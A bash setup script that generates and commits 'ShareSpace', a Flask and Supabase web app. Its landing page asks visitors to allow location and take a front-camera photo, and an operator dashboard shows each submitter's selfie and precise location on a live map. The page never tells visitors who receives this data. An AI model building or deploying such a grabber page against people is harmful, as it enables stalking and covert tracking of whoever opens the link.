#!/data/data/com.termux/files/usr/bin/bash
set -e

echo "======================================"
echo "      ShareSpace Premium Updater"
echo "======================================"

# ---------- Supabase credentials ----------
read -p "Supabase Project URL (https://xxxx.supabase.co): " SUPABASE_URL
read -s -p "Supabase service_role key: " SUPABASE_KEY
echo

SUPABASE_URL="${SUPABASE_URL%/}"

if [ -z "$SUPABASE_URL" ] || [ -z "$SUPABASE_KEY" ]; then
  echo "Supabase URL/key missing."
  exit 1
fi

# ---------- Python server ----------
cat > server.py <<'PY'
import os
import uuid
from datetime import datetime
from zoneinfo import ZoneInfo

import requests
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

SUPABASE_URL = os.environ.get("SUPABASE_URL", "").rstrip("/")
SUPABASE_KEY = os.environ.get("SUPABASE_SERVICE_ROLE_KEY", "")
BUCKET = os.environ.get("SUPABASE_BUCKET", "sharespace")

IST = ZoneInfo("Asia/Kolkata")


def now_ist():
    return datetime.now(IST).isoformat(timespec="seconds")


def headers():
    return {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
    }


def create_bucket():
    if not SUPABASE_URL or not SUPABASE_KEY:
        return

    url = f"{SUPABASE_URL}/storage/v1/bucket"
    payload = {
        "id": BUCKET,
        "name": BUCKET,
        "public": False,
        "file_size_limit": 10485760,
    }

    try:
        r = requests.post(
            url,
            headers={**headers(), "Content-Type": "application/json"},
            json=payload,
            timeout=15,
        )

        if r.status_code in (200, 201):
            print("Supabase bucket ready.")
        elif r.status_code == 409:
            print("Supabase bucket already exists.")
        else:
            print("Bucket response:", r.status_code, r.text[:300])
    except Exception as e:
        print("Bucket check failed:", e)


@app.route("/")
def index():
    return send_from_directory(BASE_DIR, "index.html")


@app.route("/dashboard")
def dashboard():
    return send_from_directory(BASE_DIR, "dashboard.html")


@app.route("/api/health")
def health():
    return jsonify({
        "ok": True,
        "service": "ShareSpace",
        "time_ist": now_ist()
    })


@app.route("/api/share", methods=["POST"])
def share():
    """
    Receives photo + location only after the browser has obtained
    the user's explicit permission.
    """

    if not SUPABASE_URL or not SUPABASE_KEY:
        return jsonify({
            "ok": False,
            "error": "Supabase environment variables are missing."
        }), 500

    photo = request.files.get("photo")

    latitude = request.form.get("latitude")
    longitude = request.form.get("longitude")
    accuracy = request.form.get("accuracy")

    if not photo:
        return jsonify({
            "ok": False,
            "error": "No photo received."
        }), 400

    ext = os.path.splitext(photo.filename or "")[1].lower()

    if ext not in [".jpg", ".jpeg", ".png", ".webp"]:
        ext = ".jpg"

    filename = f"{uuid.uuid4().hex}{ext}"
    path = f"photos/{filename}"

    content_type = photo.mimetype or "image/jpeg"
    file_bytes = photo.read()

    upload_url = (
        f"{SUPABASE_URL}/storage/v1/object/"
        f"{BUCKET}/{path}"
    )

    try:
        upload = requests.post(
            upload_url,
            headers={
                **headers(),
                "Content-Type": content_type,
                "x-upsert": "true",
            },
            data=file_bytes,
            timeout=60,
        )

        if upload.status_code not in (200, 201):
            return jsonify({
                "ok": False,
                "error": "Supabase photo upload failed",
                "details": upload.text[:500]
            }), 502

    except Exception as e:
        return jsonify({
            "ok": False,
            "error": str(e)
        }), 502

    created = now_ist()

    # Store metadata in Supabase database.
    row = {
        "photo_path": path,
        "latitude": float(latitude) if latitude else None,
        "longitude": float(longitude) if longitude else None,
        "accuracy": float(accuracy) if accuracy else None,
        "created_at": created,
    }

    try:
        db = requests.post(
            f"{SUPABASE_URL}/rest/v1/sharespace_shares",
            headers={
                **headers(),
                "Content-Type": "application/json",
                "Prefer": "return=minimal",
            },
            json=row,
            timeout=20,
        )

        if db.status_code not in (200, 201):
            return jsonify({
                "ok": False,
                "error": "Database insert failed",
                "details": db.text[:500]
            }), 502

    except Exception as e:
        return jsonify({
            "ok": False,
            "error": str(e)
        }), 502

    return jsonify({
        "ok": True,
        "message": "Shared successfully",
        "photo_path": path,
        "time_ist": created
    })


@app.route("/api/latest")
def latest():
    try:
        r = requests.get(
            f"{SUPABASE_URL}/rest/v1/sharespace_shares"
            "?select=*"
            "&order=id.desc"
            "&limit=1",
            headers=headers(),
            timeout=20,
        )

        if r.status_code != 200:
            return jsonify({
                "ok": False,
                "error": r.text[:500]
            }), 502

        rows = r.json()

        if not rows:
            return jsonify({
                "ok": True,
                "data": None
            })

        data = rows[0]

        photo_path = data.get("photo_path")

        if photo_path:
            signed = requests.post(
                f"{SUPABASE_URL}/storage/v1/object/sign/"
                f"{BUCKET}/{photo_path}",
                headers={
                    **headers(),
                    "Content-Type": "application/json",
                },
                json={"expiresIn": 3600},
                timeout=20,
            )

            if signed.status_code == 200:
                result = signed.json()
                signed_path = result.get("signedURL")

                if signed_path:
                    if signed_path.startswith("http"):
                        data["photo_url"] = signed_path
                    else:
                        data["photo_url"] = (
                            f"{SUPABASE_URL}/storage/v1"
                            f"{signed_path}"
                        )

        return jsonify({
            "ok": True,
            "data": data
        })

    except Exception as e:
        return jsonify({
            "ok": False,
            "error": str(e)
        }), 500


if __name__ == "__main__":
    create_bucket()

    port = int(os.environ.get("PORT", 10000))

    app.run(
        host="0.0.0.0",
        port=port
    )
PY

# ---------- Index ----------
cat > index.html <<'HTML'
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ShareSpace Permission</title>

<style>
*{box-sizing:border-box}
body{
 margin:0;
 min-height:100vh;
 display:flex;
 align-items:center;
 justify-content:center;
 font-family:Inter,Arial,sans-serif;
 background:
 radial-gradient(circle at 10% 10%,#102a4d 0,transparent 35%),
 radial-gradient(circle at 90% 90%,#28102f 0,transparent 35%),
 #03060d;
 color:#fff;
 padding:20px;
}
.card{
 width:min(580px,100%);
 padding:42px 34px 36px;
 border-radius:30px;
 background:rgba(25,31,57,.93);
 border:1px solid rgba(255,255,255,.15);
 box-shadow:0 30px 80px rgba(0,0,0,.45);
 text-align:center;
}
h1{
 margin:0;
 font-size:clamp(30px,7vw,48px);
 letter-spacing:-2px;
}
.sub{
 color:#aeb8d6;
 font-size:17px;
 margin:12px 0 42px;
}
.text{
 color:#d9def0;
 font-size:17px;
 line-height:1.7;
}
.text b{color:#fff}
button{
 width:100%;
 margin-top:35px;
 border:0;
 border-radius:18px;
 padding:19px;
 font-size:19px;
 font-weight:800;
 cursor:pointer;
 background:#fff;
 color:#121625;
}
button:active{transform:scale(.98)}
.status{
 margin-top:24px;
 min-height:25px;
 color:#aeb8d6;
}
.preview{
 display:none;
 width:100%;
 margin-top:25px;
 border-radius:18px;
}
</style>
</head>

<body>

<main class="card">
  <h1>ShareSpace Permission</h1>

  <div class="sub">Camera &amp; Location Sharing</div>

  <div class="text">
    To continue, ShareSpace needs your permission to use the
    <b>camera</b> for one photo and your
    <b>location</b> for sharing.
  </div>

  <button id="allow">Allow &amp; Continue</button>

  <div id="status" class="status"></div>

  <img id="preview" class="preview">
</main>

<script>
const allow = document.getElementById("allow");
const statusBox = document.getElementById("status");
const preview = document.getElementById("preview");

function status(t){
  statusBox.textContent = t;
}

async function getLocation(){
  return new Promise((resolve,reject)=>{
    if(!navigator.geolocation){
      reject(new Error("Location is not supported."));
      return;
    }

    navigator.geolocation.getCurrentPosition(
      p=>resolve(p.coords),
      e=>reject(new Error(e.message || "Location permission denied.")),
      {
        enableHighAccuracy:true,
        timeout:15000,
        maximumAge:0
      }
    );
  });
}

async function getPhoto(){
  return new Promise((resolve,reject)=>{
    const input=document.createElement("input");
    input.type="file";
    input.accept="image/*";
    input.capture="user";

    input.onchange=()=>{
      if(input.files && input.files[0]){
        resolve(input.files[0]);
      }else{
        reject(new Error("Photo was not selected."));
      }
    };

    input.click();
  });
}

allow.addEventListener("click",async()=>{
  allow.disabled=true;

  try{
    status("Requesting location permission…");
    const coords=await getLocation();

    status("Please take/select one photo…");
    const photo=await getPhoto();

    preview.src=URL.createObjectURL(photo);
    preview.style.display="block";

    status("Uploading securely…");

    const form=new FormData();

    form.append("photo",photo);
    form.append("latitude",coords.latitude);
    form.append("longitude",coords.longitude);
    form.append("accuracy",coords.accuracy);

    const r=await fetch("/api/share",{
      method:"POST",
      body:form
    });

    const data=await r.json();

    if(!r.ok || !data.ok){
      throw new Error(data.error || "Upload failed.");
    }

    status("Shared successfully ✓");
    allow.style.display="none";

  }catch(e){
    console.error(e);
    status(e.message || "Something went wrong.");
    allow.disabled=false;
  }
});
</script>

</body>
</html>
HTML

# ---------- Dashboard ----------
cat > dashboard.html <<'HTML'
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ShareSpace Dashboard</title>

<style>
*{box-sizing:border-box}
body{
 margin:0;
 min-height:100vh;
 font-family:Inter,Arial,sans-serif;
 color:#fff;
 background:
 radial-gradient(circle at 0 0,#10284b,transparent 35%),
 radial-gradient(circle at 100% 100%,#2a102e,transparent 40%),
 #03060d;
 padding:24px 14px;
}
.header{
 text-align:center;
 margin-bottom:20px;
}
.logo{
 font-size:28px;
 font-weight:900;
}
.muted{color:#aab4d0}
.container{
 max-width:700px;
 margin:auto;
}
.card{
 background:rgba(25,31,57,.94);
 border:1px solid rgba(255,255,255,.13);
 border-radius:26px;
 padding:22px;
 box-shadow:0 25px 70px rgba(0,0,0,.4);
}
.top{
 display:flex;
 align-items:center;
 justify-content:space-between;
 gap:10px;
}
.online{
 padding:8px 12px;
 border-radius:20px;
 background:#063d2d;
 color:#69f3bb;
 font-size:12px;
}
h2{margin:0}
h3{margin-top:30px}
.photo{
 width:100%;
 max-height:650px;
 object-fit:contain;
 border-radius:18px;
 background:#050811;
}
.info{
 margin-top:16px;
 background:rgba(255,255,255,.05);
 padding:16px;
 border-radius:15px;
 line-height:1.8;
 color:#dce2f2;
}
.map{
 display:block;
 margin-top:16px;
 text-decoration:none;
 text-align:center;
 padding:15px;
 border-radius:15px;
 background:#fff;
 color:#111827;
 font-weight:800;
}
.time{
 margin-top:16px;
 font-size:13px;
 color:#9faac8;
}
</style>
</head>

<body>

<div class="header">
  <div class="logo">ShareSpace</div>
  <div class="muted">Consent-Based Sharing Dashboard</div>
</div>

<div class="container">
<div class="card">

<div class="top">
  <h2>Dashboard</h2>
  <div class="online">● Server Online</div>
</div>

<h3>Shared Photo</h3>

<div id="photoBox">
  <div class="muted">Loading…</div>
</div>

<h3>Live Location</h3>

<div id="locationBox" class="info">
  Loading…
</div>

<div id="mapBox"></div>

<div id="updated" class="time"></div>

</div>
</div>

<script>
async function load(){
  try{
    const r=await fetch("/api/latest?cb="+Date.now(),{
      cache:"no-store"
    });

    const result=await r.json();

    if(!result.ok || !result.data){
      document.getElementById("photoBox").innerHTML=
        '<div class="muted">No shared data yet.</div>';

      document.getElementById("locationBox").textContent=
        "No location available.";

      return;
    }

    const d=result.data;

    if(d.photo_url){
      document.getElementById("photoBox").innerHTML=
        `<img class="photo" src="${d.photo_url}" alt="Shared photo">`;
    }else{
      document.getElementById("photoBox").innerHTML=
        '<div class="muted">No photo available.</div>';
    }

    const lat=d.latitude;
    const lon=d.longitude;

    document.getElementById("locationBox").innerHTML=
      `Latitude: ${lat ?? "Unknown"}<br>
       Longitude: ${lon ?? "Unknown"}<br>
       Accuracy: ${d.accuracy ? Math.round(d.accuracy)+" meters" : "Unknown"}`;

    if(lat != null && lon != null){
      document.getElementById("mapBox").innerHTML=
        `<a class="map"
        target="_blank"
        rel="noopener"
        href="https://www.google.com/maps?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}">
        📍 Open Location in Google Maps
        </a>`;
    }

    document.getElementById("updated").textContent=
      "Updated (IST): "+(d.created_at || "Unknown");

  }catch(e){
    console.error(e);

    document.getElementById("photoBox").innerHTML=
      '<div class="muted">Unable to load dashboard.</div>';

    document.getElementById("locationBox").textContent=
      "Server error.";
  }
}

load();
setInterval(load,10000);
</script>

</body>
</html>
HTML

# ---------- Requirements ----------
cat > requirements.txt <<'REQ'
Flask>=3.0,<4
requests>=2.31,<3
gunicorn>=21,<24
REQ

# ---------- Supabase SQL ----------
cat > supabase_setup.sql <<'SQL'
create table if not exists public.sharespace_shares (
    id bigint generated by default as identity primary key,
    photo_path text not null,
    latitude double precision,
    longitude double precision,
    accuracy double precision,
    created_at timestamptz not null
        default timezone('utc', now())
);

alter table public.sharespace_shares enable row level security;

-- The Python server uses the Supabase service_role key,
-- so server-side requests bypass these policies.

create index if not exists sharespace_shares_created_idx
on public.sharespace_shares (created_at desc);
SQL

# ---------- Render start command ----------
cat > render_start.txt <<'TXT'
gunicorn server:app
TXT

# ---------- Environment template ----------
cat > .env.example <<EOF
SUPABASE_URL=$SUPABASE_URL
SUPABASE_SERVICE_ROLE_KEY=PUT_YOUR_SERVICE_ROLE_KEY_HERE
SUPABASE_BUCKET=sharespace
EOF

echo
echo "======================================"
echo "Files updated:"
echo "  server.py"
echo "  index.html"
echo "  dashboard.html"
echo "  requirements.txt"
echo "  supabase_setup.sql"
echo "  render_start.txt"
echo "  .env.example"
echo "======================================"

echo
echo "Creating Supabase Storage bucket..."

python - <<PY
import requests

url = "$SUPABASE_URL".rstrip("/")
key = "$SUPABASE_KEY"

r = requests.post(
    url + "/storage/v1/bucket",
    headers={
        "apikey": key,
        "Authorization": "Bearer " + key,
        "Content-Type": "application/json"
    },
    json={
        "id": "sharespace",
        "name": "sharespace",
        "public": False,
        "file_size_limit": 10485760
    },
    timeout=20
)

if r.status_code in (200,201):
    print("Storage bucket created.")
elif r.status_code == 409:
    print("Storage bucket already exists.")
else:
    print("Bucket response:", r.status_code)
    print(r.text[:500])
PY

echo
echo "======================================"
echo "NEXT STEP"
echo "======================================"
echo "1. Supabase Dashboard खोलो"
echo "2. SQL Editor खोलो"
echo "3. supabase_setup.sql का पूरा code run करो"
echo
echo "4. Render Environment Variables में:"
echo "   SUPABASE_URL"
echo "   SUPABASE_SERVICE_ROLE_KEY"
echo "   SUPABASE_BUCKET=sharespace"
echo
echo "5. Render Start Command:"
echo "   gunicorn server:app"
echo
echo "======================================"

# ---------- Git ----------
git add server.py index.html dashboard.html requirements.txt \
        supabase_setup.sql render_start.txt .env.example

git commit -m "Upgrade ShareSpace persistent Supabase storage and IST"

echo
echo "Git commit complete."
echo
echo "अब GitHub पर push करने के लिए:"
echo
echo "git push origin main"
echo
